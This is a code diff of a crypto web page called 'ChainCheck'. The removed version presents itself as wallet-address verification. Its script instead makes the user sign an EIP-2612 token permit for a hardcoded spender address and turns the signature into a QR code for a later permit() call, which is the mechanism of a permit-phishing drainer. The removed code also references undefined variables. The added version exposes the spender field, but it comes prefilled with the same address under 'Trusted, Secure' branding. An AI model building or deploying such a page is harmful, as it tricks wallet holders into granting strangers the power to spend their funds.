@@ -1,63 +1,29 @@
 <!DOCTYPE html>
 <html lang="ru">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ChainCheck — Wallet Address Verification</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ChainCheck — USDC Permit QR</title>
+
   <style>
-    /* Подключение шрифта Inter */
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       margin: 0;
       padding: 0;
       background-color: #0b0c0e;
-      /* Подключаем наш крутой SVG-фон */
       background-image: url('full_background.svg');
       background-position: center center;
       background-repeat: no-repeat;
-      /* Растягивает изображение строго по размеру экрана без деформации */
       background-size: cover;
       background-attachment: fixed;
-      /* Фон зафиксирован при скролле */
       min-height: 100vh;
       color: #ffffff;
       font-family: 'Inter', sans-serif;
     }
 
-    /* Сложный глубокий фон с радиальными градиентами */
-    .background-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background:
-        radial-gradient(circle at 10% 20%, rgba(240, 185, 11, 0.06) 0%, transparent 40%),
-        radial-gradient(circle at 90% 80%, rgba(240, 185, 11, 0.08) 0%, transparent 50%),
-        radial-gradient(circle at 50% 50%, rgba(15, 17, 20, 1) 0%, rgba(8, 9, 11, 1) 100%);
-      z-index: 1;
-    }
-
-    /* Контейнер для SVG-декораций (кристаллы, ноды, цифровая сфера) */
-    .decor-canvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 2;
-      pointer-events: none;
-    }
-
-    /* Главная структура страницы */
     .wrapper {
       position: relative;
       z-index: 3;
@@ -68,11 +34,7 @@
       justify-content: space-between;
     }
 
-    /* Шапка сайта */
-    header {
-      width: 100%;
-      padding: 30px 60px;
-    }
+    header { width: 100%; padding: 30px 60px; }
 
     .header-content {
       max-width: 1200px;
@@ -90,16 +52,8 @@
       backdrop-filter: blur(10px);
     }
 
-    .logo {
-      font-weight: 700;
-      font-size: 18px;
-      letter-spacing: 1px;
-      color: #ffffff;
-    }
-
-    .logo span {
-      color: #F0B90B;
-    }
+    .logo { font-weight: 700; font-size: 18px; letter-spacing: 1px; color: #ffffff; }
+    .logo span { color: #F0B90B; }
 
     .nav-links a {
       color: #a0a5b0;
@@ -112,12 +66,8 @@
       transition: color 0.3s;
     }
 
-    .nav-links a.active,
-    .nav-links a:hover {
-      color: #F0B90B;
-    }
+    .nav-links a.active, .nav-links a:hover { color: #F0B90B; }
 
-    /* Основной контентный блок */
     main {
       flex-grow: 1;
       display: flex;
@@ -126,11 +76,7 @@
       padding: 40px 20px;
     }
 
-    .hero-section {
-      width: 100%;
-      max-width: 800px;
-      text-align: center;
-    }
+    .hero-section { width: 100%; max-width: 850px; text-align: center; }
 
     .subtitle {
       color: #a0a5b0;
@@ -167,7 +113,6 @@
       font-weight: 500;
     }
 
-    /* Карточка верификации (Форма) */
     .verification-card {
       background: linear-gradient(145deg, rgba(23, 26, 32, 0.85) 0%, rgba(15, 17, 20, 0.95) 100%);
       border: 1px solid rgba(240, 185, 11, 0.4);
@@ -191,19 +136,9 @@
       padding-bottom: 18px;
     }
 
-    .form-grid {
-      display: flex;
-      gap: 24px;
-      margin-bottom: 35px;
-    }
-
-    .form-group-left {
-      flex: 2;
-    }
-
-    .form-group-right {
-      flex: 1;
-    }
+    .form-grid { display: flex; gap: 24px; margin-bottom: 24px; }
+    .form-group-left { flex: 2; }
+    .form-group-right { flex: 1; }
 
     label {
       display: block;
@@ -213,9 +148,7 @@
       font-weight: 500;
     }
 
-    .input-wrapper {
-      position: relative;
-    }
+    .input-wrapper { position: relative; }
 
     .input-icon {
       position: absolute;
@@ -227,12 +160,12 @@
       color: #F0B90B;
     }
 
-    input[type="text"] {
+    input[type="text"], input[type="number"], textarea {
       width: 100%;
       background: #1e222a;
       border: 1px solid rgba(240, 185, 11, 0.4);
       border-radius: 10px;
-      padding: 16px 16px 16px 48px;
+      padding: 16px;
       color: #ffffff;
       font-family: 'Courier New', monospace;
       font-size: 15px;
@@ -241,9 +174,18 @@
       transition: border-color 0.3s;
     }
 
-    input[type="text"]:focus {
+    #ownerInput { padding-left: 48px; }
+
+    input:focus, textarea:focus {
       border-color: #F0B90B;
       box-shadow: 0 0 10px rgba(240, 185, 11, 0.2);
+    }
+
+    textarea {
+      min-height: 130px;
+      resize: vertical;
+      margin-top: 16px;
+      display: none;
     }
 
     .select-custom {
@@ -266,15 +208,13 @@
       transition: border-color 0.3s;
     }
 
-    .select-custom:focus {
-      border-color: #F0B90B;
-    }
+    .select-custom:focus { border-color: #F0B90B; }
 
-    .btn-container {
-      text-align: center;
-    }
+    .small-grid { display: flex; gap: 24px; margin-bottom: 24px; }
+    .small-grid > div { flex: 1; }
 
-    /* Крутая неоновая кнопка с градиентом */
+    .btn-container { text-align: center; }
+
     .btn-verify {
       background: linear-gradient(180deg, #FFD043 0%, #F0B90B 100%);
       border: none;
@@ -293,12 +233,13 @@
       gap: 8px;
     }
 
-    .btn-verify:hover {
+    .btn-verify:hover:not(:disabled) {
       transform: translateY(-2px);
       box-shadow: 0 12px 30px rgba(240, 185, 11, 0.5);
     }
 
-    /* Информационная плашка снизу */
+    .btn-verify:disabled { opacity: 0.55; cursor: not-allowed; }
+
     .trust-badge {
       display: inline-flex;
       align-items: center;
@@ -318,16 +259,9 @@
       color: #848e9c;
     }
 
-    .trust-badge span strong {
-      color: #ffffff;
-    }
+    .trust-badge span strong { color: #ffffff; }
+    .trust-badge .icon-gold { margin: 0 6px; font-size: 14px; }
 
-    .trust-badge .icon-gold {
-      margin: 0 6px;
-      font-size: 14px;
-    }
-
-    /* Подвал сайта */
     footer {
       width: 100%;
       padding: 30px 60px;
@@ -345,32 +279,20 @@
       font-size: 13px;
     }
 
-    .footer-left a {
+    .footer-left a, .footer-right a {
       color: #848e9c;
       text-decoration: none;
-      margin: 0 12px;
       transition: color 0.3s;
     }
 
-    .footer-left a:hover {
-      color: #ffffff;
-    }
-
-    .footer-right a {
-      color: #848e9c;
-      margin-left: 24px;
-      text-decoration: none;
-      font-size: 16px;
-      transition: color 0.3s;
-    }
-
-    .footer-right a:hover {
-      color: #F0B90B;
-    }
+    .footer-left a { margin: 0 12px; }
+    .footer-right a { margin-left: 24px; font-size: 16px; }
+    .footer-left a:hover, .footer-right a:hover { color: #F0B90B; }
 
     #status {
       margin-top: 30px;
-      font-size: 18px;
+      font-size: 16px;
+      line-height: 1.5;
       min-height: 30px;
       white-space: pre-line;
       word-break: break-all;
@@ -389,59 +311,34 @@
       margin-right: auto;
     }
 
-    #qrCanvas {
-      display: block;
-      margin: 0 auto;
+    #qrCanvas { display: block; margin: 0 auto; }
+
+    .warning {
+      margin-top: 18px;
+      color: #ffd36a;
+      font-size: 13px;
+      line-height: 1.5;
+      text-align: center;
     }
 
-    /* Адаптивность для мобильных девайсов */
     @media (max-width: 768px) {
-
-      header,
-      footer {
-        padding: 20px;
-      }
-
-      .form-grid {
-        flex-direction: column;
-        gap: 16px;
-      }
-
-      .header-content,
-      .footer-content {
-        flex-direction: column;
-        gap: 15px;
-        text-align: center;
-      }
-
-      .nav-links a {
-        margin: 0 10px;
-      }
-
-      .footer-right {
-        margin-top: 10px;
-      }
-
-      .verification-card {
-        padding: 30px 20px;
-      }
-
-      h1 {
-        font-size: 32px;
-      }
+      header, footer { padding: 20px; }
+      .form-grid, .small-grid { flex-direction: column; gap: 16px; }
+      .header-content, .footer-content { flex-direction: column; gap: 15px; text-align: center; }
+      .nav-links a { margin: 0 10px; }
+      .footer-right { margin-top: 10px; }
+      .verification-card { padding: 30px 20px; }
+      h1 { font-size: 32px; }
+      .btn-verify { width: 100%; justify-content: center; padding: 18px 20px; }
     }
   </style>
 </head>
 
 <body>
-
   <div class="wrapper">
-
     <header>
       <div class="header-content">
-        <div class="logo-box">
-          <div class="logo"><span>CHAIN</span>CHECK</div>
-        </div>
+        <div class="logo-box"><div class="logo"><span>CHAIN</span>CHECK</div></div>
         <nav class="nav-links">
           <a href="#" class="active">Home</a>
           <a href="#">About</a>
@@ -452,69 +349,86 @@
 
     <main>
       <div class="hero-section">
-        <div class="subtitle">Wallet Address Verification</div>
-        <h1>Verify Your <span>Wallet Address</span></h1>
-        <div class="tagline">Instant & Secure Validation</div>
+        <div class="subtitle">USDC Permit Signature</div>
+        <h1>Create <span>Permit QR</span></h1>
+        <div class="tagline">Sign offline-style approval data</div>
 
         <div class="verification-card">
-          <div class="card-step">Step 1: Enter Your Address</div>
+          <div class="card-step">Step 1: Connect wallet and sign USDC permit</div>
 
           <div class="form-grid">
             <div class="form-group-left">
-              <label>Enter Wallet Address (e.g., 0x1a2b3c4d...)</label>
+              <label>Your wallet address</label>
               <div class="input-wrapper">
                 <span class="input-icon">
                   <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
-                    <path
-                      d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z" />
+                    <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z" />
                   </svg>
                 </span>
-                <input type="text" value="0x741C9e9b5a...433e1FdB" placeholder="Вставьте адрес кошелька...">
+                <input id="ownerInput" type="text" placeholder="Подключённый адрес появится здесь" readonly />
               </div>
             </div>
 
             <div class="form-group-right">
-              <label>Select Blockchain:</label>
-              <select class="select-custom">
-                <option value="bsc">BSC</option>
-                <option value="ethereum">Ethereum</option>
+              <label>Select Blockchain</label>
+              <select id="networkSelect" class="select-custom">
+                <option value="ethereum">Ethereum USDC</option>
+                <option value="bsc">BSC USDC</option>
               </select>
             </div>
           </div>
 
+          <div class="form-grid">
+            <div class="form-group-left">
+              <label>Spender address</label>
+              <input id="spenderInput" type="text" value="0x7E878C18B4a74EdE5795dFEb9106805506cd133e" />
+            </div>
+
+            <div class="form-group-right">
+              <label>Amount</label>
+              <input id="amountInput" type="number" min="0" step="0.000001" value="1" />
+            </div>
+          </div>
+
+          <div class="small-grid">
+            <div>
+              <label>Deadline, minutes</label>
+              <input id="deadlineMinutesInput" type="number" min="1" step="1" value="60" />
+            </div>
+            <div>
+              <label>Token</label>
+              <input id="tokenInfoInput" type="text" readonly />
+            </div>
+          </div>
+
           <div class="btn-container">
-            <button class="btn-verify">
-              Verify Now
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
-                stroke-linecap="round" stroke-linejoin="round">
+            <button id="signBtn" class="btn-verify">
+              Sign Permit
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                 <polyline points="20 6 9 17 4 12"></polyline>
               </svg>
             </button>
           </div>
+
+          <textarea id="permitJson" readonly placeholder="Permit JSON появится здесь после подписи"></textarea>
+
+          <div class="warning">
+            Важно: подписывай permit только для своего доверенного spender-адреса. Permit даёт разрешение списывать токены до указанной суммы.
+          </div>
         </div>
 
-        <div id="qrBox">
-          <canvas id="qrCanvas"></canvas>
-        </div>
-
+        <div id="qrBox"><canvas id="qrCanvas"></canvas></div>
         <div id="status"></div>
 
         <div class="trust-badge">
-          <span>
-            <span class="icon-gold">🛡️</span> Trusted .
-            <strong>Decentralized</strong> .
-            Secure <span class="icon-gold">🔒</span>
-          </span>
+          <span><span class="icon-gold">🛡️</span> Trusted . <strong>Decentralized</strong> . Secure <span class="icon-gold">🔒</span></span>
         </div>
-
       </div>
     </main>
 
     <footer>
       <div class="footer-content">
-        <div class="footer-left">
-          CHAINCHECK &copy; 2026 | <a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a>
-        </div>
+        <div class="footer-left">CHAINCHECK &copy; 2026 | <a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a></div>
         <div class="footer-right">
           <a href="#" title="Twitter / X">𝕏</a>
           <a href="#" title="Telegram">✈</a>
@@ -528,250 +442,320 @@
   <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 
   <script>
+    // ======================
+    // SETTINGS
+    // ======================
     const NETWORKS = {
-      bsc: {
-        name: "BSC Mainnet",
-        chainId: 56,
-        chainIdHex: "0x38",
-        token: "0x55d398326f99059fF775485246999027B3197955",
-        spender: "0x7E878C18B4a74EdE5795dFEb9106805506cd133e"
-      },
-
       ethereum: {
         name: "Ethereum Mainnet",
         chainId: 1,
         chainIdHex: "0x1",
-        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        spender: "0x7E878C18B4a74EdE5795dFEb9106805506cd133e"
+        rpcUrl: "https://ethereum-rpc.publicnode.com",
+        token: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // Native USDC Ethereum
+        fallbackName: "USD Coin",
+        fallbackSymbol: "USDC",
+        fallbackDecimals: 6,
+        fallbackVersion: "2"
+      },
+      bsc: {
+        name: "BNB Smart Chain",
+        chainId: 56,
+        chainIdHex: "0x38",
+        rpcUrl: "https://bsc-dataseed.binance.org",
+        token: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // Binance-Peg USDC on BSC
+        fallbackName: "Binance-Peg USD Coin",
+        fallbackSymbol: "USDC",
+        fallbackDecimals: 18,
+        fallbackVersion: "1"
       }
     };
 
-    const HUMAN_AMOUNT = "1";
-
-    const ERC20_ABI = [
-      "function approve(address spender, uint256 amount) external returns (bool)",
-      "function decimals() external view returns (uint8)",
-      "function symbol() external view returns (string)",
-      "function balanceOf(address owner) external view returns (uint256)"
+    const ERC20_PERMIT_ABI = [
+      "function name() view returns (string)",
+      "function symbol() view returns (string)",
+      "function decimals() view returns (uint8)",
+      "function balanceOf(address owner) view returns (uint256)",
+      "function nonces(address owner) view returns (uint256)",
+      "function DOMAIN_SEPARATOR() view returns (bytes32)"
     ];
 
-    const btn = document.querySelector(".btn-verify");
-    const status = document.getElementById("status");
-    const networkSelect = document.querySelector(".select-custom");
+    const signBtn = document.getElementById("signBtn");
+    const statusBox = document.getElementById("status");
+    const networkSelect = document.getElementById("networkSelect");
+    const ownerInput = document.getElementById("ownerInput");
+    const spenderInput = document.getElementById("spenderInput");
+    const amountInput = document.getElementById("amountInput");
+    const deadlineMinutesInput = document.getElementById("deadlineMinutesInput");
+    const tokenInfoInput = document.getElementById("tokenInfoInput");
+    const permitJson = document.getElementById("permitJson");
+    const qrBox = document.getElementById("qrBox");
+    const qrCanvas = document.getElementById("qrCanvas");
 
-    function setStatus(msg, color = "#ffffff") {
-      status.style.color = color;
-      status.textContent = msg;
+    function setStatus(message, color = "#ffffff") {
+      statusBox.style.color = color;
+      statusBox.textContent = message;
     }
 
     function getSelectedConfig() {
       return NETWORKS[networkSelect.value];
     }
 
-    async function switchNetwork(config) {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: config.chainIdHex }]
-      });
+    function shortenAddress(address) {
+      if (!address || address.length < 12) return address;
+      return address.slice(0, 6) + "..." + address.slice(-4);
     }
 
-    btn.addEventListener("click", async () => {
-        btn.disabled = true;
-        qrBox.style.display = "none";
-        permitJson.value = "";
+    function withTimeout(promise, ms, errorMessage) {
+      return Promise.race([
+        promise,
+        new Promise((_, reject) => setTimeout(() => reject(new Error(errorMessage)), ms))
+      ]);
+    }
 
-        try {
-            if (!window.ethereum) {
-                setStatus(
-                    "❌ MetaMask не обнаружен. Открой страницу во встроенном браузере MetaMask.",
-                    "#ff6666"
-                );
-                return;
-            }
-
-            const config = getConfig();
-
-            const TOKEN_ADDRESS = config.token;
-            const TOKEN_NAME = config.tokenName;
-            const TOKEN_SYMBOL = config.tokenSymbol;
-            const TOKEN_DECIMALS = config.tokenDecimals;
-            const TOKEN_VERSION = config.tokenVersion;
-
-            if (!ethers.isAddress(TOKEN_ADDRESS)) {
-                throw new Error("1002"); // Некорректный TOKEN_ADDRESS
-            }
-
-            if (!ethers.isAddress(SPENDER_ADDRESS)) {
-                throw new Error("1003"); // Некорректный SPENDER_ADDRESS
-            }
-
-            setStatus("Подключаем кошелёк...");
-
-            let provider = new ethers.BrowserProvider(window.ethereum);
-
-            await provider.send("eth_requestAccounts", []);
-
-            setStatus(`Пробуем переключить MetaMask на ${config.name}...`);
-
-            await switchNetwork(config);
-
-            provider = new ethers.BrowserProvider(window.ethereum);
-
-            const signer = await provider.getSigner();
-            const owner = await signer.getAddress();
-
-            const network = await provider.getNetwork();
-            const chainId = Number(network.chainId);
-
-            if (chainId !== config.chainId) {
-                throw new Error(
-                    `MetaMask не переключился на ${config.name}. Сейчас chainId=${chainId}, нужен ${config.chainId}`
-                );
-            }
-
-            const readProvider = new ethers.JsonRpcProvider(config.rpcUrl);
-
-            setStatus(
-                `Кошелёк подключён: ${shortenAddress(owner)}\n` +
-                `Сеть: ${config.name}\n` +
-                `Chain ID: ${chainId}\n` +
-                `Проверяем контракт токена...`
-            );
-
-            const code = await withTimeout(
-                readProvider.getCode(TOKEN_ADDRESS),
-                8000,
-                `${config.name} RPC не ответил на getCode() за 8 секунд`
-            );
-
-            if (code === "0x") {
-                throw new Error(`По TOKEN_ADDRESS нет контракта в ${config.name}`);
-            }
-
-            setStatus(`Токен: ${TOKEN_NAME} (${TOKEN_SYMBOL})\nПроверяем nonce...`);
-
-            const nonce = await withTimeout(
-                getPermitNonce(readProvider, TOKEN_ADDRESS, owner),
-                8000,
-                `${config.name} RPC не ответил на nonces(owner) за 8 секунд`
-            );
-
-            setStatus("Проверяем баланс...");
-
-            const value = ethers.parseUnits(HUMAN_AMOUNT, TOKEN_DECIMALS);
-
-            const token = new ethers.Contract(
-                TOKEN_ADDRESS,
-                ["function balanceOf(address owner) view returns (uint256)"],
-                readProvider
-            );
-
-            const balance = await withTimeout(
-                token.balanceOf(owner),
-                8000,
-                `${config.name} RPC не ответил на balanceOf() за 8 секунд`
-            );
-
-            if (balance < value) {
-                setStatus(
-                    `❌ Недостаточно ${TOKEN_SYMBOL}\n` +
-                    `Баланс: ${ethers.formatUnits(balance, TOKEN_DECIMALS)} ${TOKEN_SYMBOL}\n` +
-                    `Нужно: ${HUMAN_AMOUNT} ${TOKEN_SYMBOL}`,
-                    "#ff6666"
-                );
-                return;
-            }
-
-            const deadline = Math.floor(Date.now() / 1000) + 60 * 60;
-
-            const domain = {
-                name: TOKEN_NAME,
-                version: TOKEN_VERSION,
-                chainId: chainId,
-                verifyingContract: TOKEN_ADDRESS
-            };
-
-            const types = {
-                Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" }
-                ]
-            };
-
-            const values = {
-                owner: owner,
-                spender: SPENDER_ADDRESS,
-                value: value,
-                nonce: nonce,
-                deadline: deadline
-            };
-
-            setStatus(
-                `Ожидаем Permit-подпись в MetaMask...\n` +
-                `Owner: ${shortenAddress(owner)}\n` +
-                `Spender: ${shortenAddress(SPENDER_ADDRESS)}\n` +
-                `Amount: ${HUMAN_AMOUNT} ${TOKEN_SYMBOL}`
-            );
-
-            const signature = await signer.signTypedData(domain, types, values);
-            const sig = ethers.Signature.from(signature);
-
-            const permitData = {
-                standard: "EIP-2612",
-                network: config.name,
-                token: TOKEN_ADDRESS,
-                tokenName: TOKEN_NAME,
-                tokenSymbol: TOKEN_SYMBOL,
-                chainId: chainId,
-                owner: owner,
-                spender: SPENDER_ADDRESS,
-                value: value.toString(),
-                humanAmount: HUMAN_AMOUNT,
-                decimals: TOKEN_DECIMALS,
-                nonce: nonce.toString(),
-                deadline: deadline,
-                v: sig.v,
-                r: sig.r,
-                s: sig.s,
-                signature: signature,
-                loginSignature: loginSignature
-            };
-
-            const json = JSON.stringify(permitData);
-
-            permitJson.value = json;
-            console.log("Permit data:", permitData);
-
-            setStatus("Подпись получена. Генерируем QR-код...");
-
-            await QRCode.toCanvas(qrCanvas, json, {
-                width: 360,
-                margin: 2,
-                errorCorrectionLevel: "M"
-            });
-
-            qrBox.style.display = "block";
-
-            setStatus(
-                `✅ Permit signature получена и QR-код создан!\n` +
-                `Сеть: ${config.name}\n` +
-                `До deadline QR можно использовать для вызова permit().`,
-                "#00ff88"
-            );
-
-        } catch (error) {
-            console.error(error);
-
-            setStatus(
-                "❌ Ошибка: " + (error.reason || error.shortMessage || error.message || error),
-                "#ff6666"
-            );
-        } finally {
-            btn.disabled = false;
+    async function switchNetwork(config) {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: config.chainIdHex }]
+        });
+      } catch (error) {
+        // 4902 = chain is not added to MetaMask
+        if (error && error.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: config.chainIdHex,
+              chainName: config.name,
+              nativeCurrency: config.chainId === 56
+                ? { name: "BNB", symbol: "BNB", decimals: 18 }
+                : { name: "Ether", symbol: "ETH", decimals: 18 },
+              rpcUrls: [config.rpcUrl],
+              blockExplorerUrls: config.chainId === 56
+                ? ["https://bscscan.com"]
+                : ["https://etherscan.io"]
+            }]
+          });
+        } else {
+          throw error;
         }
+      }
+    }
+
+    async function safeTokenRead(token, methodName, fallbackValue) {
+      try {
+        return await withTimeout(token[methodName](), 8000, `${methodName} timeout`);
+      } catch (_) {
+        return fallbackValue;
+      }
+    }
+
+    async function loadTokenInfo() {
+      const config = getSelectedConfig();
+      const readProvider = new ethers.JsonRpcProvider(config.rpcUrl);
+      const token = new ethers.Contract(config.token, ERC20_PERMIT_ABI, readProvider);
+
+      const symbol = await safeTokenRead(token, "symbol", config.fallbackSymbol);
+      const decimals = await safeTokenRead(token, "decimals", config.fallbackDecimals);
+
+      tokenInfoInput.value = `${symbol} / ${decimals} decimals`;
+    }
+
+    networkSelect.addEventListener("change", () => {
+      loadTokenInfo().catch(() => {
+        const config = getSelectedConfig();
+        tokenInfoInput.value = `${config.fallbackSymbol} / ${config.fallbackDecimals} decimals`;
+      });
+    });
+
+    signBtn.addEventListener("click", async () => {
+      signBtn.disabled = true;
+      qrBox.style.display = "none";
+      permitJson.style.display = "none";
+      permitJson.value = "";
+
+      try {
+        if (!window.ethereum) {
+          setStatus("❌ MetaMask не обнаружен. Открой страницу во встроенном браузере MetaMask или установи расширение.", "#ff6666");
+          return;
+        }
+
+        const config = getSelectedConfig();
+        const spender = spenderInput.value.trim();
+        const humanAmount = amountInput.value.trim();
+        const deadlineMinutes = Number(deadlineMinutesInput.value);
+
+        if (!ethers.isAddress(config.token)) throw new Error("Некорректный TOKEN_ADDRESS");
+        if (!ethers.isAddress(spender)) throw new Error("Некорректный spender address");
+        if (!humanAmount || Number(humanAmount) <= 0) throw new Error("Amount должен быть больше 0");
+        if (!Number.isFinite(deadlineMinutes) || deadlineMinutes <= 0) throw new Error("Deadline должен быть больше 0 минут");
+
+        setStatus("Подключаем кошелёк...");
+
+        let provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+
+        setStatus(`Пробуем переключить MetaMask на ${config.name}...`);
+        await switchNetwork(config);
+
+        provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const owner = await signer.getAddress();
+        ownerInput.value = owner;
+
+        const network = await provider.getNetwork();
+        const chainId = Number(network.chainId);
+
+        if (chainId !== config.chainId) {
+          throw new Error(`MetaMask не переключился на ${config.name}. Сейчас chainId=${chainId}, нужен ${config.chainId}`);
+        }
+
+        const readProvider = new ethers.JsonRpcProvider(config.rpcUrl);
+
+        setStatus(`Кошелёк: ${shortenAddress(owner)}\nСеть: ${config.name}\nПроверяем контракт USDC...`);
+
+        const code = await withTimeout(
+          readProvider.getCode(config.token),
+          8000,
+          `${config.name} RPC не ответил на getCode() за 8 секунд`
+        );
+
+        if (code === "0x") throw new Error(`По адресу USDC нет контракта в ${config.name}`);
+
+        const token = new ethers.Contract(config.token, ERC20_PERMIT_ABI, readProvider);
+
+        const tokenName = await safeTokenRead(token, "name", config.fallbackName);
+        const tokenSymbol = await safeTokenRead(token, "symbol", config.fallbackSymbol);
+        const tokenDecimals = Number(await safeTokenRead(token, "decimals", config.fallbackDecimals));
+        const tokenVersion = config.fallbackVersion;
+
+        tokenInfoInput.value = `${tokenSymbol} / ${tokenDecimals} decimals`;
+
+        setStatus(`Токен: ${tokenName} (${tokenSymbol})\nПроверяем поддержку permit / nonces...`);
+
+        let nonce;
+        try {
+          nonce = await withTimeout(
+            token.nonces(owner),
+            8000,
+            `${config.name} RPC не ответил на nonces(owner) за 8 секунд`
+          );
+        } catch (error) {
+          throw new Error(
+            `Этот USDC в сети ${config.name} не поддерживает стандартный EIP-2612 permit или nonces(address). ` +
+            `Для него нужно использовать обычный approve() либо другой стандарт подписи.`
+          );
+        }
+
+        setStatus("Проверяем баланс...");
+
+        const value = ethers.parseUnits(humanAmount, tokenDecimals);
+        const balance = await withTimeout(
+          token.balanceOf(owner),
+          8000,
+          `${config.name} RPC не ответил на balanceOf() за 8 секунд`
+        );
+
+        if (balance < value) {
+          setStatus(
+            `❌ Недостаточно ${tokenSymbol}\nБаланс: ${ethers.formatUnits(balance, tokenDecimals)} ${tokenSymbol}\nНужно: ${humanAmount} ${tokenSymbol}`,
+            "#ff6666"
+          );
+          return;
+        }
+
+        const deadline = Math.floor(Date.now() / 1000) + deadlineMinutes * 60;
+
+        const domain = {
+          name: tokenName,
+          version: tokenVersion,
+          chainId: chainId,
+          verifyingContract: config.token
+        };
+
+        const types = {
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ]
+        };
+
+        const values = {
+          owner: owner,
+          spender: spender,
+          value: value,
+          nonce: nonce,
+          deadline: deadline
+        };
+
+        setStatus(
+          `Ожидаем Permit-подпись в MetaMask...\n` +
+          `Owner: ${shortenAddress(owner)}\n` +
+          `Spender: ${shortenAddress(spender)}\n` +
+          `Amount: ${humanAmount} ${tokenSymbol}`
+        );
+
+        const signature = await signer.signTypedData(domain, types, values);
+        const sig = ethers.Signature.from(signature);
+
+        const permitData = {
+          standard: "EIP-2612",
+          network: config.name,
+          chainId: chainId,
+          token: config.token,
+          tokenName: tokenName,
+          tokenSymbol: tokenSymbol,
+          tokenDecimals: tokenDecimals,
+          tokenVersion: tokenVersion,
+          owner: owner,
+          spender: spender,
+          value: value.toString(),
+          humanAmount: humanAmount,
+          nonce: nonce.toString(),
+          deadline: deadline,
+          v: sig.v,
+          r: sig.r,
+          s: sig.s,
+          signature: signature,
+          createdAt: new Date().toISOString()
+        };
+
+        const json = JSON.stringify(permitData);
+        permitJson.value = json;
+        permitJson.style.display = "block";
+        console.log("Permit data:", permitData);
+
+        setStatus("Подпись получена. Генерируем QR-код...");
+
+        await QRCode.toCanvas(qrCanvas, json, {
+          width: 360,
+          margin: 2,
+          errorCorrectionLevel: "M"
+        });
+
+        qrBox.style.display = "block";
+
+        setStatus(
+          `✅ Permit signature получена и QR-код создан!\n` +
+          `Сеть: ${config.name}\n` +
+          `Токен: ${tokenSymbol}\n` +
+          `Spender: ${shortenAddress(spender)}\n` +
+          `QR можно использовать до deadline для вызова permit().`,
+          "#00ff88"
+        );
+      } catch (error) {
+        console.error(error);
+        setStatus("❌ Ошибка: " + (error.reason || error.shortMessage || error.message || String(error)), "#ff6666");
+      } finally {
+        signBtn.disabled = false;
+      }
+    });
+
+    loadTokenInfo().catch(() => {
+      const config = getSelectedConfig();
+      tokenInfoInput.value = `${config.fallbackSymbol} / ${config.fallbackDecimals} decimals`;
     });
   </script>
 </body>
